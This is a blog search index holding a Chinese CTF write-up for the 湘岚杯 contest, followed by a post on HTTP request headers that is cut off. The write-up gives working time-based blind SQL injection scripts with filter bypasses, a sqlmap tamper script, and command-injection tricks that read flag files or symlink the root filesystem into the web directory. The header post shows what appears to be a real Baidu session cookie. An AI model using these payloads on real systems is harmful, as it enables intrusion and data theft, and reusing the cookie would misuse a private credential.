<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>湘岚杯wp</title>
      <link href="/2025/01/20/%E6%B9%98%E5%B2%9A%E6%9D%AFwp/"/>
      <url>/2025/01/20/%E6%B9%98%E5%B2%9A%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="冷暴力"><a href="#冷暴力" class="headerlink" title="冷暴力"></a>冷暴力</h1><p>不管输入什么，页面均只回显”嗯”，经典的时间盲注</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%B9%98%E5%B2%9A%E6%9D%AFwp/image-20250120144015342.png" alt="image-20250120144015342"></p><p>构造payload为<code>1 and sleep(2)</code>尝试，能够sleep，说明为数字型且sleep未被过滤，构造payload如下</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(<span class="number">1</span>,sleep(<span class="number">2</span>),<span class="number">0</span>)#    #能够sleep，说明if、逗号未被过滤</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(length(<span class="number">1</span>)<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">2</span>),<span class="number">0</span>)#    #不能sleep，说明length或<span class="operator">=</span>被过滤</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(<span class="number">2</span>)#    #能够sleep，说明<span class="operator">=</span>未被过滤，尝试大写绕过length</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(Length(<span class="number">1</span>)<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">2</span>),<span class="number">0</span>)#    #成功sleep(双写绕过也行)</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(substr(<span class="string">&#x27;1&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>,sleep(<span class="number">2</span>),<span class="number">0</span>)#  #不能sleep，说明substr被过滤，大写或双写绕过尝试</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(subsubstrstr(<span class="string">&#x27;1&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>,sleep(<span class="number">2</span>),<span class="number">0</span>)#   #成功sleep</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(subsubstrstr(<span class="string">&#x27;1&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">49</span>,sleep(<span class="number">2</span>),<span class="number">0</span>)#  #不能sleep，尝试双写绕过ascii</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(asasciicii(subsubstrstr(<span class="string">&#x27;1&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">49</span>,sleep(<span class="number">2</span>),<span class="number">0</span>)# #成功sleep</span><br><span class="line">测试完成，有length,substr,ascii被过滤,脚本测试中还有<span class="keyword">group</span>,database被过滤，双写即可</span><br></pre></td></tr></table></figure><p>注意:这个题有两个坑，其一就是最后的列名为flag，但是flag被过滤了，因此在最后查列名时要通过双写flag即flflagag来绕过；其二就是flag不在当前库中，脚本写最后一个查询语句时要通过<code>lookthere.there</code>来查询(我之前写的半自动脚本由于直接用表名拼接查询忘了限制库，导致最后没结果，后面的脚本都进行了改进，将第一个都变成了查全部库名，最后一个查询语句都加上了库名限制)</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):  </span><br><span class="line">            payload = <span class="string">f&quot;if(ascasciiii(subsubstrstr((select grgroupoup_concat(schema_name) from information_schema.schemata),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(2),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;id&#x27;</span>:payload+<span class="string">&#x27;#&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">2</span> : </span><br><span class="line">                find += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,库名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> find</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force1</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):  </span><br><span class="line">            payload = <span class="string">f&quot;if(asasciicii(subsubstrstr((select grgroupoup_concat(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;database&#125;</span>&#x27; ),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(2),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;id&#x27;</span>:payload+<span class="string">&#x27;#&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">2</span> : </span><br><span class="line">                find += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,表名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force2</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):  </span><br><span class="line">            payload = <span class="string">f&quot;if(asasciicii(subsubstrstr((select grgroupoup_concat(column_name) from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27; ),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(2),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;id&#x27;</span>:payload+<span class="string">&#x27;#&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">2</span> : </span><br><span class="line">                find += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,列名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force3</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):  </span><br><span class="line">            payload = <span class="string">f&quot;if(asasciicii(subsubstrstr((select grgroupoup_concat(<span class="subst">&#123;column&#125;</span>) from <span class="subst">&#123;database&#125;</span>.<span class="subst">&#123;table&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(2),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;id&#x27;</span>:payload+<span class="string">&#x27;#&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">2</span> : </span><br><span class="line">                find += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,flag为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 指定的URL</span></span><br><span class="line">    url = <span class="string">&#x27;http://xlctf.huhstsec.top:27732&#x27;</span></span><br><span class="line">    brute_force(url)</span><br><span class="line">    database=<span class="built_in">input</span>(<span class="string">&quot;请输入库名:&quot;</span>)</span><br><span class="line">    brute_force1(url)</span><br><span class="line">    table=<span class="built_in">input</span>(<span class="string">&quot;请输入表名:&quot;</span>)</span><br><span class="line">    brute_force2(url)</span><br><span class="line">    column=<span class="built_in">input</span>(<span class="string">&quot;请输入列名:&quot;</span>)<span class="comment">#注意输入flflagag</span></span><br><span class="line">    brute_force3(url)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%B9%98%E5%B2%9A%E6%9D%AFwp/image-20250120154723006.png" alt="image-20250120154723006"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%B9%98%E5%B2%9A%E6%9D%AFwp/image-20250120154732372.png" alt="image-20250120154732372"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%B9%98%E5%B2%9A%E6%9D%AFwp/image-20250120154744535.png" alt="image-20250120154744535"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%B9%98%E5%B2%9A%E6%9D%AFwp/image-20250120154809650.png" alt="image-20250120154809650"></p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>在跑sqlmap时没想到最后的flag还要进行绕过，导致跑出来结果为空，还以为又把flag像web227一样丢进程里面了(跑半下午没结果)，看了wp才明白，直接给payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#另存为tamper中xl.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="comment"># 定义需要转换的单词及其对应的转换规则</span></span><br><span class="line">    transformations = &#123;</span><br><span class="line">        <span class="string">&#x27;ascii&#x27;</span>: <span class="string">&#x27;ascasciiii&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;substr&#x27;</span>: <span class="string">&#x27;subsubstrstr&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;group&#x27;</span>: <span class="string">&#x27;grgroupoup&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;database&#x27;</span>: <span class="string">&#x27;datadatabasebase&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;flag&#x27;</span>: <span class="string">&#x27;flflagag&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个结果字符串</span></span><br><span class="line">    result = payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历所有需要转换的单词并应用转换规则</span></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> transformations.items():</span><br><span class="line">        result = result.replace(key, value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://xlctf.huhstsec.top:27732 --data id=1 -batch --tamper &quot;xl.py&quot; -tech T -D lookthere -T there -dump</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%B9%98%E5%B2%9A%E6%9D%AFwp/image-20250120154625469.png" alt="image-20250120154625469"></p><h1 id="关关难过关关过"><a href="#关关难过关关过" class="headerlink" title="关关难过关关过"></a>关关难过关关过</h1><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%B9%98%E5%B2%9A%E6%9D%AFwp/image-20250120160145850.png" alt="image-20250120160145850"></p><p>第一关首先为参数one的sha1值和参数two的md5值弱比较，令两个均为0e开头即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">one=aaroZmOk&amp;two=QNKCDZO</span><br></pre></td></tr></table></figure><p>下一个十一位数xxxx7894xxx的md5值为19cb79e80ab6d5400950c392d077cc1c，脚本爆破即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hash</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(value).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">target_md5 = <span class="string">&quot;19cb79e80ab6d5400950c392d077cc1c&quot;</span></span><br><span class="line">fixed_part = <span class="string">&quot;7894&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有可能的组合</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):  <span class="comment"># 前四位</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):  <span class="comment"># 后三位</span></span><br><span class="line">        num_str = <span class="string">f&quot;<span class="subst">&#123;i:04d&#125;</span><span class="subst">&#123;fixed_part&#125;</span><span class="subst">&#123;j:03d&#125;</span>&quot;</span></span><br><span class="line">        </span><br><span class="line">        hash_value = md5_hash(num_str)</span><br><span class="line">        <span class="keyword">if</span> hash_value == target_md5:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found match: <span class="subst">&#123;num_str&#125;</span>&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;No match found.&quot;</span>)</span><br></pre></td></tr></table></figure><p>完整payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">14_12_45=65417894321&amp;one=aaroZmOk&amp;two=QNKCDZO</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%B9%98%E5%B2%9A%E6%9D%AFwp/image-20250120160202327.png" alt="image-20250120160202327"></p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>直接变量覆盖，传<code>key=b84eb44c485303b69630663fc2f9c050af508dda</code>即可，不过注意的是<code>parse_str($_SERVER[&#39;QUERY_STRING&#39;]);</code>这个函数是处理url中的变量，因此要用GET传参</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%B9%98%E5%B2%9A%E6%9D%AFwp/image-20250120160600189.png" alt="image-20250120160600189"></p><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>过滤了一堆字符，但是\未被过滤，直接POST传参<code>input=ca\t /fllllag</code>即可</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%B9%98%E5%B2%9A%E6%9D%AFwp/image-20250120160737520.png" alt="image-20250120160737520"></p><hr><p>也可使用软链接</p><p>先<code>pwd</code>查看当前位置</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%B9%98%E5%B2%9A%E6%9D%AFwp/image-20250120161250424.png" alt="image-20250120161250424"></p><p>创造软链接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">input=ln -s / /var/www/html/aaa</span><br></pre></td></tr></table></figure><p>然后访问aaa&#x2F;fllllag即可下载一个含flag的文件(换环境了)</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%B9%98%E5%B2%9A%E6%9D%AFwp/image-20250120161756611.png" alt="image-20250120161756611"></p><h1 id="大道轮回"><a href="#大道轮回" class="headerlink" title="大道轮回"></a>大道轮回</h1><p>源码如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">跳出轮回的真谛开头是:XNCTF</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sha256&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$sha256</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sha256&#x27;</span>];</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha256</span>(<span class="variable">$sha256</span>), <span class="number">0</span>, <span class="number">6</span>) === <span class="string">&#x27;647d99&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;踏平坎坷成大道，斗罢艰险又出发&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag|&amp;nbsp;|[0-9]|$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\|%|\x09|\x26/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;打破顽空，跳出轮回的真谛在：&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span> . <span class="string">&quot; &gt; /dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;取了真经又如何，不过是只有功的泼猴&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;是假易灭，是假难除&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你终究不是他&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SHA-256 计算函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sha256</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>首先要让sha256和cmd两个变量存在，并且sha256经过hash函数加密后前六位为647d99，<code>cmd</code>在不匹配字符的情况下进行命令执行。通过以下脚本来找到匹配的字符</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标哈希前缀</span></span><br><span class="line">target_prefix = <span class="string">&quot;647d99&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成随机字符串的长度</span></span><br><span class="line">string_length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试次数限制</span></span><br><span class="line">max_attempts = <span class="number">1000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>(<span class="params">length</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成指定长度的随机字符串&quot;&quot;&quot;</span></span><br><span class="line">    letters_and_digits = string.ascii_letters + string.digits</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(letters_and_digits) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_matching_string</span>(<span class="params">target_prefix, hash_func, max_attempts, string_length</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;查找哈希值前缀匹配的字符串&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(max_attempts):</span><br><span class="line">        <span class="comment"># 生成随机字符串</span></span><br><span class="line">        test_string = generate_random_string(string_length)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 计算哈希值</span></span><br><span class="line">        hash_object = hash_func(test_string.encode())</span><br><span class="line">        hex_dig = hash_object.hexdigest()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查哈希值的前缀是否匹配</span></span><br><span class="line">        <span class="keyword">if</span> hex_dig.startswith(target_prefix):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found matching string after <span class="subst">&#123;attempt + <span class="number">1</span>&#125;</span> attempts: <span class="subst">&#123;test_string&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Hash value: <span class="subst">&#123;hex_dig&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> test_string</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed to find a matching string within the given number of attempts.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 SHA-256 算法进行查找</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    result = find_matching_string(target_prefix, hashlib.sha256, max_attempts, string_length)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%B9%98%E5%B2%9A%E6%9D%AFwp/image-20250120162816166.png" alt="image-20250120162816166"></p><p>后面的判断语句中的<code>system($cmd . &quot; &gt; /dev/null 2&gt;&amp;1&quot;);</code>会舍弃标准输出和标准错误都舍弃，但是可以用;来进行截断，比如传入<code>cmd=ls;ls</code>，即<code>system(ls;ls . &quot; &gt; /dev/null 2&gt;&amp;1&quot;);</code>前面的ls能正常执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sha256=ByxAE&amp;cmd=ca\t /Fl@@@g;ls</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%B9%98%E5%B2%9A%E6%9D%AFwp/image-20250120170302857.png" alt="image-20250120170302857"></p>]]></content>
      
      
      <categories>
          
          <category> 赛题复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解请求头信息</title>
      <link href="/2025/01/14/%E8%AF%A6%E8%A7%A3%E8%AF%B7%E6%B1%82%E5%A4%B4%E4%BF%A1%E6%81%AF/"/>
      <url>/2025/01/14/%E8%AF%A6%E8%A7%A3%E8%AF%B7%E6%B1%82%E5%A4%B4%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<p>参考<a href="https://blog.csdn.net/weixin_37846886/article/details/141033907">详解request headers（一篇讲完常见字段）</a></p><h1 id="0x01定义"><a href="#0x01定义" class="headerlink" title="0x01定义"></a>0x01定义</h1><p>HTTP请求头部（HTTP Request Headers）：HTTP协议中的一部分，用于在客户端和服务器之间传递附加信息。这些头部字段提供了关于请求、客户端环境、或请求的上下文的信息。</p><p>请求头是键值对的形式，每个key对应填写相应的内容（内容可能包括多个取值，取多个值时，以“;”分隔）。<br>通过bp抓包可以得到或者更改请求头信息，比如以下就是通过bp抓访问百度包的请求头</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> / <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: www.baidu.com</span><br><span class="line"><span class="title class_">Cookie</span>: <span class="variable constant_">BAIDUID</span>=<span class="variable constant_">D915327BE37405BA6581E6C24AC9305D</span><span class="symbol">:FG=</span><span class="number">1</span>; sensorsdata2015jssdkcross=%7B%22distinct_id%<span class="number">22</span>%3A%<span class="number">22380654666</span>%<span class="number">22</span>%2C%22first_id%<span class="number">22</span>%3A%221935df1042d1e5a-0a8a9fc02-4c657b58-<span class="number">1821369</span>-1935df1042eeb5%<span class="number">22</span>%2C%22props%7D%2C%<span class="number">22</span>%24device_id%<span class="number">22</span>%3A%221935df1042d1e5a-00faf5a8a9fc02-4c657b58-<span class="number">1821369</span>-1935df1042eeb5%<span class="number">22</span>%7D; <span class="variable constant_">BDUSS</span>=1NNWkM5Vkt2b3U2Q2dVazBSY043dTBpVW82fnQ1bzJnOTJ-<span class="title class_">TEM2RHVSczdLbnRuRVFBQUFBJCQAAAAAAAAAAAEAAABE9JvK0</span>~fH373cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADudU2c7nVNnN; </span><br><span class="line"><span class="title class_">Upgrade</span>-<span class="title class_">Insecure</span>-<span class="title class_">Requests</span>: <span class="number">1</span></span><br><span class="line"><span class="title class_">User</span>-<span class="title class_">Agent</span>: <span class="title class_">Mozilla</span>/<span class="number">5.0</span> (<span class="title class_">Windows</span> <span class="variable constant_">NT</span> <span class="number">10.0</span>; <span class="title class_">Win64</span>; x64) <span class="title class_">AppleWebKit</span>/<span class="number">537.36</span> (<span class="variable constant_">KHTML</span>, like <span class="title class_">Gecko</span>) <span class="title class_">Chrome</span>/<span class="number">131.0</span>.<span class="number">0.0</span> <span class="title class_">Safari</span>/<span class="number">537.36</span> <span class="title class_">Edg</span>/<span class="number">131.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="title class_">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="regexp">/*;q=0.8,application/signed</span>-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line"><span class="title class_">Sec</span>-<span class="title class_">Ch</span>-<span class="title class_">Ua</span>: <span class="string">&quot;Microsoft Edge&quot;</span>;v=<span class="string">&quot;131&quot;</span>, <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;131&quot;</span>, <span class="string">&quot;Not_A Brand&quot;</span>;v=<span class="string">&quot;24&quot;</span></span><br><span class="line"><span class="title class_">Sec</span>-<span class="title class_">Ch</span>-<span class="title class_">Ua</span>-<span class="title class_">Mobile</span>: <span class="string">?0</span></span><br><span class="line"><span class="title class_">Sec</span>-<span class="title class_">Ch</span>-<span class="title class_">Ua</span>-<span class="title class_">Platform</span>: <span class="string">&quot;Windows&quot;</span></span><br><span class="line"><span class="title class_">Sec</span>-<span class="title class_">Fetch</span>-<span class="title class_">Site</span>: none</span><br><span class="line"><span class="title class_">Sec</span>-<span class="title class_">Fetch</span>-<span class="title class_">Mode</span>: navigate</span><br><span class="line"><span class="title class_">Sec</span>-<span class="title class_">Fetch</span>-<span class="title class_">User</span>: <span class="string">?1</span></span><br><span class="line"><span class="title class_">Sec</span>-<span class="title class_">Fetch</span>-<span class="title class_">Dest</span>: document</span><br><span class="line"><span class="title class_">Accept</span>-<span class="title class_">Encoding</span>: gzip, deflate, br</span><br><span class="line"><span class="title class_">Accept</span>-<span class="title 